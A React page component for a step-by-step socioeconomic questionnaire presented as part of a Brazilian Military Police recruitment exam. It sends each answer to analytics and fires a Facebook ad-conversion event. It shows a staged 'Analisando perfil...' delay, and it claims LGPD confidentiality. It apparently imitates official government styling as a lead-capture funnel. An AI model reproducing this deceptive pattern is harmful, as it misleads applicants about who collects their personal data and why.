import { useState, useEffect } from 'react';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { useClarityEvents } from '@/hooks/use-clarity-events';
import { useEstadoPM } from '@/hooks/useEstadoPM';

interface FormData {
  situacao_ocupacional: string;
  escolaridade: string;
  estado_civil: string;
  filhos: string;
  renda_familiar: string;
  tempo_livre: string;
  concurso_pm_anterior: string;
  motivo_pm: string;
  deslocamento: string;
  // Women-specific
  presenca_feminina: string;
  cuidados_familiares: string;
  area_atuacao: string;
}

const TOTAL_REGULAR = 9;
const TOTAL_WOMEN = 3;

export default function PessoalPage() {
  const estadoPM = useEstadoPM();
  const sigla = estadoPM?.sigla ?? 'PM';

  const [currentQuestion, setCurrentQuestion] = useState(0);
  const [firstName, setFirstName] = useState('');
  const [isWoman, setIsWoman] = useState(false);
  const [isEducationAutoFilled, setIsEducationAutoFilled] = useState(false);
  const [formData, setFormData] = useState<FormData>({
    situacao_ocupacional: '',
    escolaridade: '',
    estado_civil: '',
    filhos: '',
    renda_familiar: '',
    tempo_livre: '',
    concurso_pm_anterior: '',
    motivo_pm: '',
    deslocamento: '',
    presenca_feminina: '',
    cuidados_familiares: '',
    area_atuacao: '',
  });

  const { trackEvent, trackGenderSelection } = useClarityEvents();

  const totalQuestions = isWoman ? TOTAL_REGULAR + TOTAL_WOMEN : TOTAL_REGULAR;

  useEffect(() => {
    window.scrollTo(0, 0);

    const userData = localStorage.getItem('userData');
    if (userData) {
      try {
        const parsed = JSON.parse(userData);
        const fullName = parsed.autoFilledData?.nome || parsed.nomeCompleto || '';
        if (fullName) {
          const first = fullName.split(' ')[0];
          setFirstName(first.charAt(0).toUpperCase() + first.slice(1).toLowerCase());
        }
        const gender = parsed.genero || parsed.autoFilledData?.sexo;
        if (gender === 'feminino' || gender === 'f' || gender === 'F') {
          setIsWoman(true);
          trackGenderSelection('feminino', 'pessoal_page_load');
        } else {
          trackGenderSelection('masculino', 'pessoal_page_load');
        }
        trackEvent('personal_assessment_started', { page: 'pessoal_page', user_gender: gender });
      } catch {}
    }

    // Auto-fill education
    const escolaridadeData = localStorage.getItem('escolaridadeData');
    if (escolaridadeData) {
      try {
        const parsed = JSON.parse(escolaridadeData);
        const map: Record<string, string> = {
          'FUNDAMENTAL INCOMPLETO': 'ensino_fundamental',
          'FUNDAMENTAL COMPLETO': 'ensino_fundamental',
          'MEDIO INCOMPLETO': 'ensino_medio',
          'MEDIO COMPLETO': 'ensino_medio',
          'SUPERIOR INCOMPLETO': 'superior_cursando',
          'SUPERIOR COMPLETO': 'superior_concluido',
        };
        const mapped = map[parsed?.escolaridade];
        if (mapped) {
          setFormData(prev => ({ ...prev, escolaridade: mapped }));
          setIsEducationAutoFilled(true);
        }
      } catch {}
    }

    // Restore saved
    const saved = localStorage.getItem('pessoalData');
    if (saved) {
      try { setFormData(JSON.parse(saved)); } catch {}
    }
  }, []);

  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, [currentQuestion]);

  const handleChange = (field: keyof FormData, value: string) => {
    const updated = { ...formData, [field]: value };
    setFormData(updated);
    localStorage.setItem('pessoalData', JSON.stringify(updated));
    trackEvent('socioeconomico_answer', { field, value, page: 'pessoal_page' });
  };

  const isAnswered = () => {
    const fields: (keyof FormData)[] = [
      'situacao_ocupacional', 'escolaridade', 'estado_civil', 'filhos',
      'renda_familiar', 'tempo_livre', 'concurso_pm_anterior', 'motivo_pm', 'deslocamento',
      'presenca_feminina', 'cuidados_familiares', 'area_atuacao',
    ];
    const f = fields[currentQuestion];
    if (!f) return false;
    return !!formData[f];
  };

  const isComplete = () => {
    const base = formData.situacao_ocupacional && formData.escolaridade &&
      formData.estado_civil && formData.filhos && formData.renda_familiar &&
      formData.tempo_livre && formData.concurso_pm_anterior && formData.motivo_pm &&
      formData.deslocamento;
    if (isWoman) return base && formData.presenca_feminina && formData.cuidados_familiares && formData.area_atuacao;
    return base;
  };

  const handleSubmit = () => {
    if (!isComplete()) return;
    const fbq = (window as any).fbq;
    if (fbq) fbq('track', 'CustomizeProduct', { content_name: `Concurso ${sigla}`, value: 6893.00, currency: 'BRL' });
    localStorage.setItem('pessoalData', JSON.stringify(formData));
    const btn = document.querySelector('[data-submit-button]') as HTMLButtonElement;
    if (btn) { btn.disabled = true; btn.textContent = 'Analisando perfil...'; }
    setTimeout(() => { window.location.href = '/temporarios'; }, 2000);
  };

  // ─── Helpers de layout ────────────────────────────────────────────────────

  const QuestionCard = ({
    index, title, subtitle, children, feminine = false,
  }: { index: number; title: string; subtitle?: string; children: React.ReactNode; feminine?: boolean }) => {
    const progress = ((index + 1) / totalQuestions) * 100;
    return (
      <div id={`question-${index}`} style={{
        background: '#fff',
        borderTop: `3px solid ${feminine ? '#7c3aed' : '#1351b4'}`,
        boxShadow: '0 2px 12px rgba(0,0,0,0.07)',
        fontFamily: 'Rawline, Arial, sans-serif',
      }}>
        {/* Barra de progresso */}
        <div style={{ height: 3, background: '#e5e7eb', position: 'relative' }}>
          <div style={{
            position: 'absolute', top: 0, left: 0, height: '100%',
            width: `${progress}%`,
            background: feminine ? '#7c3aed' : '#1351b4',
            transition: 'width 0.4s ease',
          }} />
        </div>

        <div style={{ padding: '20px 24px 24px' }}>
          {/* Cabeçalho da pergunta */}
          <div style={{ marginBottom: 20 }}>
            {feminine && (
              <span style={{
                display: 'inline-block', fontSize: 10, fontWeight: 700,
                color: '#7c3aed', textTransform: 'uppercase', letterSpacing: '0.08em',
                marginBottom: 6,
              }}>Avaliação complementar</span>
            )}
            <p style={{ fontSize: 15, fontWeight: 600, color: '#0c326f', lineHeight: '1.45', margin: 0 }}>
              {title}
            </p>
            {subtitle && (
              <p style={{ fontSize: 12, color: '#6b7280', marginTop: 4 }}>{subtitle}</p>
            )}
          </div>

          {/* Conteúdo */}
          {children}
        </div>

      </div>
    );
  };

  const RadioRows = ({
    field, options,
  }: { field: keyof FormData; options: { value: string; label: string }[] }) => (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
      {options.map(opt => {
        const selected = formData[field] === opt.value;
        return (
          <label key={opt.value} style={{
            display: 'flex', alignItems: 'center', gap: 12,
            padding: '10px 14px',
            border: `1.5px solid ${selected ? '#1351b4' : '#e5e7eb'}`,
            background: selected ? '#f0f4fb' : '#fafafa',
            cursor: 'pointer',
            transition: 'all 0.15s',
          }}>
            <div style={{
              width: 16, height: 16, borderRadius: '50%', flexShrink: 0,
              border: `2px solid ${selected ? '#1351b4' : '#d1d5db'}`,
              background: selected ? '#1351b4' : '#fff',
              display: 'flex', alignItems: 'center', justifyContent: 'center',
            }}>
              {selected && <div style={{ width: 6, height: 6, borderRadius: '50%', background: '#fff' }} />}
            </div>
            <input
              type="radio"
              name={field}
              value={opt.value}
              checked={selected}
              onChange={() => handleChange(field, opt.value)}
              style={{ display: 'none' }}
            />
            <span style={{ fontSize: 13, color: selected ? '#0c326f' : '#374151', fontWeight: selected ? 600 : 400 }}>
              {opt.label}
            </span>
          </label>
        );
      })}
    </div>
  );

  // ─── Perguntas ────────────────────────────────────────────────────────────

  const renderCurrentQuestion = () => {
    switch (currentQuestion) {

      case 0:
        return (
          <QuestionCard index={0} title="Qual é sua situação profissional atual?">
            <RadioRows field="situacao_ocupacional" options={[
              { value: 'estudante', label: 'Estudante' },
              { value: 'empregado_privado', label: 'Empregado(a) em empresa privada' },
              { value: 'servidor_publico', label: 'Servidor(a) público(a) ou militar' },
              { value: 'autonomo', label: 'Autônomo(a) ou trabalho informal' },
              { value: 'sem_atividade', label: 'Não exerço atividade remunerada' },
            ]} />
          </QuestionCard>
        );

      case 1:
        return (
          <QuestionCard index={1} title="Qual é o seu nível de escolaridade concluído?">
            {isEducationAutoFilled && (
              <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 14, padding: '8px 12px', background: '#f0fdf4', borderLeft: '3px solid #268744' }}>
                <svg style={{ width: 14, height: 14, color: '#268744', flexShrink: 0 }} fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                </svg>
                <span style={{ fontSize: 12, color: '#1a7a3a', fontWeight: 600 }}>Preenchido automaticamente</span>
              </div>
            )}
            <RadioRows field="escolaridade" options={[
              { value: 'ensino_fundamental', label: 'Ensino fundamental completo' },
              { value: 'ensino_medio', label: 'Ensino médio completo' },
              { value: 'curso_tecnico', label: 'Curso técnico' },
              { value: 'superior_cursando', label: 'Ensino superior incompleto' },
              { value: 'superior_concluido', label: 'Ensino superior concluído' },
            ]} />
          </QuestionCard>
        );

      case 2:
        return (
          <QuestionCard index={2} title="Qual é o seu estado civil?">
            <RadioRows field="estado_civil" options={[
              { value: 'solteiro', label: isWoman ? 'Solteira' : 'Solteiro' },
              { value: 'casado', label: isWoman ? 'Casada ou em união estável' : 'Casado ou em união estável' },
              { value: 'separado', label: isWoman ? 'Separada ou divorciada' : 'Separado ou divorciado' },
              { value: 'viuvo', label: isWoman ? 'Viúva' : 'Viúvo' },
            ]} />
          </QuestionCard>
        );

      case 3:
        return (
          <QuestionCard index={3} title="Você possui filhos ou dependentes?">
            <RadioRows field="filhos" options={[
              { value: 'nao', label: 'Não' },
              { value: '1', label: '1 filho/dependente' },
              { value: '2', label: '2 filhos/dependentes' },
              { value: '3_mais', label: '3 ou mais' },
            ]} />
          </QuestionCard>
        );

      case 4:
        return (
          <QuestionCard index={4} title="Qual é a faixa de renda familiar mensal?" subtitle="Considere a soma da renda de todos que moram com você.">
            <RadioRows field="renda_familiar" options={[
              { value: 'ate_1sm', label: 'Até 1 salário mínimo' },
              { value: '1_3sm', label: 'Entre 1 e 3 salários mínimos' },
              { value: '3_6sm', label: 'Entre 3 e 6 salários mínimos' },
              { value: '6_10sm', label: 'Entre 6 e 10 salários mínimos' },
              { value: 'acima_10sm', label: 'Acima de 10 salários mínimos' },
            ]} />
          </QuestionCard>
        );

      case 5:
        return (
          <QuestionCard index={5} title="Qual atividade ocupa a maior parte do seu tempo livre?">
            <RadioRows field="tempo_livre" options={[
              { value: 'esportes', label: 'Atividades esportivas e físicas (academia, corrida, artes marciais)' },
              { value: 'estudos', label: 'Estudos, leitura e aperfeiçoamento profissional' },
              { value: 'cultura', label: 'Cultura e entretenimento (cinema, teatro, jogos)' },
              { value: 'ar_livre', label: 'Atividades ao ar livre (trilhas, parques, caminhada)' },
              { value: 'outros', label: 'Outros' },
            ]} />
          </QuestionCard>
        );

      case 6:
        return (
          <QuestionCard index={6} title="Você já participou de algum concurso para a Polícia Militar anteriormente?">
            <RadioRows field="concurso_pm_anterior" options={[
              { value: 'primeira_vez', label: 'Não, esta é minha primeira tentativa' },
              { value: '1_2_vezes', label: 'Sim, uma ou duas vezes' },
              { value: '3_mais', label: 'Sim, três vezes ou mais' },
            ]} />
          </QuestionCard>
        );

      case 7:
        return (
          <QuestionCard index={7} title={`Qual é o principal motivo pelo qual deseja ingressar na ${sigla}?`}>
            <RadioRows field="motivo_pm" options={[
              { value: 'estabilidade', label: 'Estabilidade e segurança no emprego público' },
              { value: 'remuneracao', label: 'Remuneração, benefícios e aposentadoria' },
              { value: 'vocacao', label: 'Vocação e missão de servir e proteger a sociedade' },
              { value: 'carreira', label: 'Crescimento e progressão na carreira militar' },
              { value: 'influencia', label: 'Indicação ou influência de familiares ou amigos policiais' },
            ]} />
          </QuestionCard>
        );

      case 8:
        return (
          <QuestionCard index={8} title={`Você teria disponibilidade para servir em batalhão ou unidade em cidade diferente da sua residência?`} subtitle={`A ${sigla} possui unidades distribuídas por todo o estado.`}>
            <RadioRows field="deslocamento" options={[
              { value: 'plena', label: 'Sim, tenho plena disponibilidade de deslocamento' },
              { value: 'regiao', label: 'Sim, desde que seja na mesma região ou estado' },
              { value: 'prefiro_local', label: `Prefiro permanecer próximo${isWoman ? 'a' : '(a)'} à minha cidade` },
            ]} />
          </QuestionCard>
        );

      // ── Perguntas femininas ──────────────────────────────────────────────

      case 9:
        return isWoman ? (
          <QuestionCard index={9} feminine title={`Você acredita que a presença feminina fortalece a ${sigla}?`}>
            <RadioRows field="presenca_feminina" options={[
              { value: 'sim', label: 'Sim, com certeza' },
              { value: 'depende', label: 'Depende da área ou situação' },
              { value: 'sem_opiniao', label: 'Não tenho opinião formada' },
            ]} />
          </QuestionCard>
        ) : null;

      case 10:
        return isWoman ? (
          <QuestionCard index={10} feminine title="Você possui cuidados familiares (filhos, idosos) que possam influenciar sua disponibilidade durante o curso de formação?">
            <RadioRows field="cuidados_familiares" options={[
              { value: 'nao', label: 'Não' },
              { value: 'sim_organizo', label: 'Sim, mas consigo me organizar' },
              { value: 'prefiro_nao', label: 'Prefiro não responder' },
            ]} />
          </QuestionCard>
        ) : null;

      case 11:
        return isWoman ? (
          <QuestionCard index={11} feminine title="Você tem interesse em atuar na área operacional ou prefere a área administrativa?">
            <RadioRows field="area_atuacao" options={[
              { value: 'operacional', label: 'Operacional — policiamento ostensivo e atividades de campo' },
              { value: 'administrativa', label: 'Administrativa — gestão, suporte e atividades internas' },
              { value: 'ambas', label: 'Ambas, conforme a necessidade do serviço' },
            ]} />
          </QuestionCard>
        ) : null;

      default:
        return null;
    }
  };

  const isLastQuestion = currentQuestion === totalQuestions - 1;

  return (
    <div className="min-h-screen" style={{ backgroundColor: '#fff', fontFamily: 'Rawline, Arial, sans-serif' }}>
      <ExercitoHeader customTitle={sigla} customSubtitle="Questionário Socioeconômico" />

      <main style={{ maxWidth: 680, margin: '0 auto', padding: '0 16px 48px' }}>

        {/* Cabeçalho da seção */}
        <div style={{ paddingTop: 24, paddingBottom: 24 }}>
          <h1 style={{ fontSize: 22, fontWeight: 700, color: '#0c326f', margin: '0 0 8px', lineHeight: 1.3 }}>
            {firstName ? `${firstName}, ` : ''}Questionário Socioeconômico
          </h1>
          <p style={{ fontSize: 13, color: '#6b7280', margin: 0, lineHeight: 1.6 }}>
            As informações coletadas são tratadas de forma confidencial conforme a LGPD — Lei nº 13.709/2018 — e utilizadas exclusivamente para fins deste concurso.
          </p>
        </div>

        {/* Card da pergunta */}
        {renderCurrentQuestion()}

        {/* Navegação */}
        <div style={{
          display: 'flex', justifyContent: 'space-between', alignItems: 'center',
          marginTop: 16, gap: 12,
        }}>
          <button
            onClick={() => currentQuestion > 0 && setCurrentQuestion(q => q - 1)}
            disabled={currentQuestion === 0}
            style={{
              padding: '12px 24px',
              border: '1.5px solid #1351b4',
              background: 'transparent',
              color: '#1351b4',
              fontWeight: 600, fontSize: 13,
              cursor: currentQuestion === 0 ? 'not-allowed' : 'pointer',
              opacity: currentQuestion === 0 ? 0.4 : 1,
              borderRadius: 0,
              fontFamily: 'Rawline, Arial, sans-serif',
            }}
          >
            ← Anterior
          </button>

          {isLastQuestion && isComplete() ? (
            <button
              onClick={handleSubmit}
              data-submit-button
              style={{
                flex: 1, padding: '13px 24px',
                background: '#268744', color: '#fff',
                fontWeight: 700, fontSize: 13,
                border: 'none', borderRadius: 0, cursor: 'pointer',
                fontFamily: 'Rawline, Arial, sans-serif',
                letterSpacing: '0.02em',
              }}
            >
              Finalizar questionário →
            </button>
          ) : (
            <button
              onClick={() => isAnswered() && !isLastQuestion && setCurrentQuestion(q => q + 1)}
              disabled={!isAnswered() || isLastQuestion}
              style={{
                flex: 1, padding: '13px 24px',
                background: isAnswered() && !isLastQuestion ? '#1351b4' : '#9ca3af',
                color: '#fff',
                fontWeight: 700, fontSize: 13,
                border: 'none', borderRadius: 0,
                cursor: isAnswered() && !isLastQuestion ? 'pointer' : 'not-allowed',
                fontFamily: 'Rawline, Arial, sans-serif',
                letterSpacing: '0.02em',
              }}
            >
              Próxima →
            </button>
          )}
        </div>

        {/* Nota de rodapé */}
        <p style={{ fontSize: 11, color: '#9ca3af', textAlign: 'center', marginTop: 20 }}>
          {sigla} · Dados tratados conforme a LGPD — Lei nº 13.709/2018
        </p>
      </main>

      <ExercitoFooter />
    </div>
  );
}
